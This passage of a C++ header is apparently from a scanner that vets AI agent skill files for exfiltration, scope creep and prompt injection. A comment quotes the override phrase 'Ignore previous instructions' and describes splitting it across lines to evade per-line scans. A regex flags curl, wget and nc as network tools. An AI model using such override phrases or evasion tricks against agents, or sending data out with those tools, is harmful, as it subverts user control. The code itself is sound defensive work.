                }
                while( !normalized.empty() && normalized.back() == ' ' )
                {
                    normalized.pop_back();
                }

                if( !normalized.empty() )
                {
                    if( !joinedBody.empty() )
                    {
                        joinedBody += ' ';
                    }
                    joinedLineOffsets.push_back( { joinedBody.size(), lineNum } );
                    joinedBody += normalized;
                }
            }

            // ── EXFILTRATE (regex) ────────────────────────────────────────────────────────────────
            // requiresCmdContext patterns (api-key, cred paths) fire only with command context — a fenced
            // run-block or a co-occurring transmit verb. A bare prose mention of a credential is documentation.
            // fenceOnly patterns (net-exfil) fire only inside a fenced code block — see buildExfilPatterns().
            for( const ExfilPattern& p : exfilPats )
            {
                const bool matched = p.isNetExfilShape ? hasNetExfilShape( ln ) : isHit( skillSearch( p.re, ln, stackBytes ), lineNum, ln );
                if( !matched )
                {
                    continue;
                }
                if( p.fenceOnly && !lineInFence )
                {
                    continue;
                }
                if( p.requiresCmdContext && !( lineInFence || isHit( hasTransmitVerb( ln, stackBytes ), lineNum, ln ) ) )
                {
                    continue;
                }
                addFinding( SkillSeverity::Critical, lineNum, p.rule, ln );
                break;   // one EXFILTRATE finding per line
            }

            // ── SCOPE-CREEP check ─────────────────────────────────────────────────────────────────
            // Conservative: only flag if Bash is definitely not allowed AND the line looks like
            // an actual shell command instruction (starts after a backtick fence, or literally
            // starts with $, or contains `curl`/`wget`/`nc` in an imperative-looking context).
            // We flag WARN, not CRITICAL.
            if( !bashAllowed && !allowedTools.empty() )
            {
                const std::string_view lv = trimRight( ln );
                // Indicators: a line that starts an executable shell context:
                //   1. Inside a fenced ```bash / ```sh / ```shell block header
                //   2. Line starts with $ (interactive-shell style)
                //   3. Line contains curl/wget/nc (network tools — likely a shell instruction)
                // ^…$ with a search is the whole-string match the old regex_match asked for: `lv` holds one line, no '\n'.
                static const RegexCompile kBashFenceRe = compileGuardedRegex( R"(^```\s*(bash|sh|shell|zsh)\s*$)", kRegexEcmaScript );
                static const RegexCompile kNetToolRe   = compileGuardedRegex( R"(\b(curl|wget|nc)\b)", kRegexEcmaScript );
                const bool isShellFence     = isHit( skillSearch( kBashFenceRe, lv, stackBytes ), lineNum, ln );
                const bool startsWithDollar = !lv.empty() && lv[0] == '$';
                const bool hasNetTool       = isHit( skillSearch( kNetToolRe, lv, stackBytes ), lineNum, ln );
                if( isShellFence || startsWithDollar || hasNetTool )
                {
                    addFinding( SkillSeverity::Warn, lineNum, kScopeCreepRule, ln );
                }
            }
        }
    }

    // ── second pass: whitespace-normalized joined body (A4-F12 §3) ───────────────────────────────
    // Catches an INJECTION phrase split across a newline ("Ignore previous\ninstructions"), which the
    // per-line scan above never sees since neither half-line matches on its own. `joinedBody` collapses all
    // whitespace runs (incl. newlines) to single spaces, so a phrase that was only broken by line-wrapping
    // now reads as one contiguous run. Only the FIRST occurrence per pattern is reported here (this pass
    // exists to catch the evasion, not to duplicate the exhaustive per-line scan); the (line, rule) dedupe
    // below collapses the case where the same instance was already found per-line.
    // Map a joined-body offset back to a real line number: the start of the joined-body run whose recorded offset is
    // the greatest one not exceeding `pos`. Honest fallback: line 0 if somehow no line offset was recorded (joinedBody
    // is built only from lines we did record, so this shouldn't happen, but a degrade-safe default beats an
    // out-of-range read).
    const auto joinedLineOf = [ & ]( std::size_t pos )
    {
        const auto it = std::upper_bound( joinedLineOffsets.begin(), joinedLineOffsets.end(), pos,
            []( std::size_t value, const std::pair<std::size_t,int>& entry ) noexcept { return value < entry.first; } );
        return it != joinedLineOffsets.begin() ? std::prev( it )->second : 0;
    };
    // The windows the pass searches, in order (kSkillJoinedWindowBytes above): each ends at a space (or the body's end)
    // and the next starts just after the FIRST space at or after end − kSkillJoinedOverlapBytes. A match crossing `end`
    // is at most kSkillInjectionSpanBytes long, so it starts at a word past end − kSkillInjectionSpanBytes whose
    // leading space is at or after end − kSkillJoinedOverlapBytes: the next window starts at or before it and holds it
    // whole. (Searching BACK from end − kSkillJoinedOverlapBytes found no space inside a long spaceless run and jumped
    // past `end`, missing a phrase that straddled it.) A run with no space
    // past a full window stretches the window to the next space instead of cutting a word; a window that ends up past
    // the engine's bound is Skipped and fails the skill closed, as a long line does.
    std::vector<std::pair<std::size_t, std::size_t>> joinedWindows;
    for( std::size_t begin = 0; begin < joinedBody.size(); )
    {
        std::size_t end = joinedBody.size();
        if( begin + kSkillJoinedWindowBytes < joinedBody.size() )
        {
            const std::size_t lastSpace = joinedBody.rfind( ' ', begin + kSkillJoinedWindowBytes );
            const std::size_t nextSpace = joinedBody.find( ' ', begin + kSkillJoinedWindowBytes );
            end = ( lastSpace != std::string::npos && lastSpace > begin + kSkillJoinedOverlapBytes ) ? lastSpace
                : ( nextSpace != std::string::npos )                                                 ? nextSpace
                                                                                                     : joinedBody.size();
        }
        joinedWindows.push_back( { begin, end } );
        if( end == joinedBody.size() )
        {
            break;
        }
        // `end` is a space here and end > begin + kSkillJoinedOverlapBytes, so the search finds one at or before `end`, past
        // `begin`: every window starts later than the one before it.
        begin = joinedBody.find( ' ', end - kSkillJoinedOverlapBytes ) + 1;
    }
    for( const InjectionPattern& p : injPats )
    {
        RegexCaptures m;
        RegexVerdict  verdict     = RegexVerdict::Miss;
        std::size_t   windowBegin = 0;
        for( const auto& [ wBegin, wEnd ] : joinedWindows )
        {
            windowBegin = wBegin;
            verdict     = skillSearch( p.re, std::string_view( joinedBody ).substr( wBegin, wEnd - wBegin ), stackBytes, &m );
            if( verdict != RegexVerdict::Miss )
            {
                break;   // the first hit (or the first undecided window) settles this pattern, as the unwindowed pass did
            }
        }
        if( verdict == RegexVerdict::Exhausted || verdict == RegexVerdict::Skipped )
        {
            // the joined window has no one line to blame: attribute the unscannable pass to the window's first line
            addFinding( SkillSeverity::Critical, joinedLineOf( windowBegin ),
                        verdict == RegexVerdict::Exhausted ? kScanIncompleteRule : kScanIncompleteRuleOversize,
                        "the whitespace-joined body (cross-line injection pass)" );
            continue;
        }
        if( verdict != RegexVerdict::Hit )
        {
            continue;
        }
        const std::size_t pos = windowBegin + std::size_t( m.position( 0 ) );
        if( isShownAsData( joinedBody, pos ) )
        {
            continue;
        }
        addFinding( p.sev, joinedLineOf( pos ), p.rule, m.str( 0 ) );
    }

    // ── sort by (line, rule) for deterministic output, then dedupe on (line, rule) ────────────────
    // The per-line pass and the joined-body pass can both find the SAME instance (e.g. a phrase that sits
    // entirely on one line is found per-line, then found again — same line, same rule — in the joined
    // buffer); collapse those to a single finding so output stays deterministic and non-redundant.
    std::sort( findings.begin(), findings.end(), []( const SkillFinding& a, const SkillFinding& b ) noexcept
               {
        if( a.line != b.line ) { return a.line < b.line;
}
        return std::string_view( a.rule ) < std::string_view( b.rule ); } );
    findings.erase( std::unique( findings.begin(), findings.end(), []( const SkillFinding& a, const SkillFinding& b ) noexcept
    {
        return a.line == b.line && std::string_view( a.rule ) == std::string_view( b.rule );
    } ), findings.end() );

    return findings;
}

// scanSkillTextOn on one thread with a kSkillScanStackBytes stack (a reservation: pages commit only as deep as a match
// recurses), so a long skill line gets the bound that stack affords instead of the caller's. A thread the system refuses
// runs the scan on the caller at kCallerStackBytesFloor, disclosed by stackthreads.h. A throw out of the scan (an
// allocation failure) cannot leave the thread, so it becomes one CRITICAL scan-aborted finding: a skill whose scan did
// not finish never reads clean.
inline std::vector<SkillFinding> scanSkillText( std::string_view text )
{
    std::vector<SkillFinding> findings;
    const auto scan = [ & ]( std::size_t settledBytes )
    {
        try
        {
            findings = scanSkillTextOn( text, settledBytes );
        }
        catch( ... )
        {
            findings = std::vector<SkillFinding>( 1, SkillFinding{ SkillSeverity::Critical, 0, detail::kScanIncompleteRuleAborted, "the scan stopped before it finished" } );
            DISCLOSE( "skillscan: the scan threw before it finished — reported as a CRITICAL scan-aborted finding" );
        }
    };
    runOnStackThreads( 1, kSkillScanStackBytes, scan );
    return findings;
}


// ── file and directory entry points ──────────────────────────────────────────────────────────────

// Result of a checked scan: distinguishes "read the file, ran the scan, got N findings" (possibly
// zero — a legitimate clean scan) from "never scanned it — the path itself could not be read" (missing,
// permission-denied, or a directory). Every entry point needs the two apart: --scan-skill refuses an
// unreadable path (§P0.5a — a typo'd path must never read as "safe"), and the two directory walks
// (--scan-skills, wrap.h's wrapScanSkillDir) score a file they found but could not read CRITICAL
// (kScanIncompleteRuleUnreadable). The unchecked scanSkillFile() that read "cannot scan" as "nothing
// found" for wrap.h is gone for that reason.
struct SkillFileReadResult
{
    bool                        readable = false;   // false = path could not be scanned at all
    std::vector<SkillFinding>   findings;            // valid only when readable == true
};

// NO DISCLOSE on the unreadable paths here, deliberately, and it is not an omission (M7/F20,
// capture-audit 2026-09-04). That log line means "this run CONTINUED in a reduced mode"; every caller of
// THIS function refuses or scores the file CRITICAL by name instead, so the alert would stamp a
// deduplicated, pathless degrade notice beside a disclosure that already says which file and why.
inline SkillFileReadResult scanSkillFileChecked( const std::string& path )
{
    std::error_code ec;
    if( std::filesystem::is_directory( path, ec ) )
    {
        return {};
    }
    std::ifstream f( path );
    if( !f )
    {
        return {};
    }
    std::ostringstream buf;
    buf << f.rdbuf();
    if( f.bad() )
    {
        return {};
    }
    return { true, scanSkillText( buf.str() ) };   // empty file → empty findings → a legitimate clean scan
}

// NOTE: directory scanning (recursive .md discovery + per-file scan + exit-code aggregation) is
// done by the --scan-skills call site in main.cpp, not here — it needs per-file printing as it
// walks, which a `vector<SkillFinding>` with no file attribution cannot support. A prior
// `scanSkillDir()` duplicated that walk and returned findings with no path field (traceable to no
// file); it was unused (main.cpp never called it) and unusable, so it was removed rather than fixed.

// ── exit-code helper ──────────────────────────────────────────────────────────────────────────────

// 2 if any Critical, else 1 if any Warn, else 0.
inline int skillScanExitCode( const std::vector<SkillFinding>& findings ) noexcept
{
    int code = 0;
    for( const SkillFinding& f : findings )
    {
        if( f.sev == SkillSeverity::Critical )
        {
            return 2;
        }
        if( f.sev == SkillSeverity::Warn && code < 1 )
        {
            code = 1;
        }
    }
    return code;
}

// ── §P6.9 stdout artifact ─────────────────────────────────────────────────────────────────────────
//
// --scan-skill/--scan-skills were the only two verbs with no deterministic stdout artifact: on a CLEAN
// scan (the common case — vetting a skill before install) stdout was byte-empty, and even a dirty scan
// only got ad-hoc human-readable lines with no header a caller could parse for counts. Every OTHER verb
// in this tool emits exactly one well-formed document (XML, or markdown for --report/--recall) to stdout;
// this brings skillscan in line with a small, capped, deterministic `<skillscan>` element. stderr's tally
// line and the 0/1/2 verdict / 3 refusal exit codes are UNCHANGED (test/skillscanreadcheck.sh pins the
// refusal path — this artifact is emitted ONLY on the printSkillScanArtifact call sites, which sit strictly
// after the refusal `return 3`s in main.cpp, so a refused scan still has byte-empty stdout; test/skillscan.sh
// pins the verdicts, which are computed exactly as before).

constexpr std::size_t kSkillScanFindingCap = 200;   // generous for one file or a small dir; caps a pathological --scan-skills sweep

// minimal attribute-value XML escape. skillscan.h is intentionally dependency-light (it runs BEFORE the
// heavy ingest pipeline main.cpp defers to for everything else — see the call site comment), so this does
// not pull in serialize.h's escapeXml for one small attribute; paths here are filesystem paths, not
// arbitrary source text, so the 4-case table is enough (no CDATA/UTF-8-scrub machinery needed).
inline std::string escapeXmlAttr( std::string_view s )
{
    std::string out;
    out.reserve( s.size() );
    for( char c : s )
    {
        switch( c )
        {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            default:   out += c;        break;
        }
    }
    return out;
}

// one (path, finding) pair — the flattened cross-file record printSkillScanArtifact prints from. A plain
// value type (not a pointer into the caller's per-file vectors) so the artifact can be built by accumulating
// across a whole --scan-skills directory walk without lifetime games.
struct SkillScanRow
{
    std::string  path;
    SkillFinding finding;
};

// Lowercase, unpadded XML attribute form of a severity ("critical"/"warn"/"info") — DERIVED from
// skillSeverityStr (the single source of truth wrap.h's plain-text display already uses) rather than
// restating the SkillSeverity->name mapping in a second switch, which the clone detector correctly flags
// as a near-duplicate of skillSeverityStr's. skillSeverityStr pads with trailing spaces for column
// alignment ("WARN    "); stop at the first space to strip that padding.
inline std::string skillSeverityAttr( SkillSeverity s )
{
    std::string out;
    for( const char c : std::string_view( skillSeverityStr( s ) ) )
    {
        if( c == ' ' )
        {
            break;
        }
        out += char( std::tolower( static_cast<unsigned char>( c ) ) );
    }
    return out;
}

// Emit `<skillscan files=".." findings=".." [skipped=".."] [shown=".." capped="1"] verdict="clean|warn|critical">`
// + one `<f p="path:line" rule=".." sev=".."/>` per finding (capped at kSkillScanFindingCap), `</skillscan>`.
// Deterministic: rows print in the caller's existing (file, line, rule) order — never re-sorted here.
// `verdict=` is derived from the SAME severities as skillScanExitCode (0/1/2 <-> clean/warn/critical), so
// it can never disagree with the exit code the caller separately returns.
//
// §B13.3: `filesSkipped` is how many files the caller's walk SAW and could not scan (unreadable — each also
// carries a CRITICAL SCAN-INCOMPLETE:file-unreadable row) — the other half of the population `files=` counts. A verdict must not be silently narrower
// than its subject, and "clean" over a directory whose executables were never opened is exactly that.
// Emitted only when non-zero (the house rule: absent = nothing skipped, so every existing artifact and gate
// stays byte-identical), and defaulted so the single-file entry point — which scans the one file it is given
// and skips nothing — needs no change.
inline void printSkillScanArtifact( std::FILE* out, const std::vector<SkillScanRow>& rows, int filesScanned, int filesSkipped = 0 ) noexcept
{
    int maxSev = 0;
    for( const SkillScanRow& r : rows )
    {
        if( int( r.finding.sev ) > maxSev )
        {
            maxSev = int( r.finding.sev );
        }
    }
    const char* verdict = maxSev == 2 ? "critical" : ( maxSev == 1 ? "warn" : "clean" );

    const std::size_t total  = rows.size();
    const std::size_t shown  = total < kSkillScanFindingCap ? total : kSkillScanFindingCap;
    const bool         capped = shown < total;

    rw::emitTo( out, "<skillscan files=\"{}\" findings=\"{}\"", filesScanned, total );
    if( filesSkipped > 0 )
    {
        rw::emitTo( out, " skipped=\"{}\"", filesSkipped );
    }
    if( capped )
    {
        rw::emitTo( out, " shown=\"{}\" capped=\"1\"", shown );
    }
    rw::emitTo( out, " verdict=\"{}\">", verdict );
    for( std::size_t i = 0; i < shown; ++i )
    {
        const SkillScanRow& r = rows[i];
        rw::emitTo( out, "<f p=\"{}:{}\" rule=\"{}\" sev=\"{}\"/>",
                     escapeXmlAttr( r.path ).c_str(), r.finding.line, r.finding.rule, skillSeverityAttr( r.finding.sev ).c_str() );
    }
    rw::emitRaw( out, "</skillscan>\n" );
}

}   // namespace rw
